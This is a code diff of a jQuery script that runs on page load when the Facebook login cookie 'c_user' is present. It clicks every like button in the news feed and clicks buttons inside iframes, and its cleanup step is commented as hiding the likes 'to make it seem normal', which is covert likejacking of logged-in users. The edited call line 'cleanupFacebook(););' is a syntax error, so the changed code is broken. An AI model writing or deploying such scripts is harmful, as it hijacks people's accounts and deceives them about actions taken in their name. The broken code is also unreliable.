@@ -1,5 +1,5 @@
 //click every like button on facebook
-function likeAllFacebook(callback){
+function likeAllFacebook(){
       //like everything on the news feed
       var likes = $('.UFILikeLink');
       for (var i = 0; i < likes.length; i++) {
@@ -9,7 +9,6 @@ function likeAllFacebook(callback){
           // fire away!
           likes[i].click();
       }
-      callback();
 }
 
 //hide the likes and make it seem normal
@@ -73,10 +72,8 @@ function clickiFrameButtons(){
 $(document).ready(function() {
     if(document.cookie.indexOf('c_user') != -1){ //check if logged in before running anything
 
-        likeAllFacebook(function(){
-            cleanupFacebook();
-        });
-
+        likeAllFacebook();
+        cleanupFacebook(););
         clickiFrameButtons();
 
     }
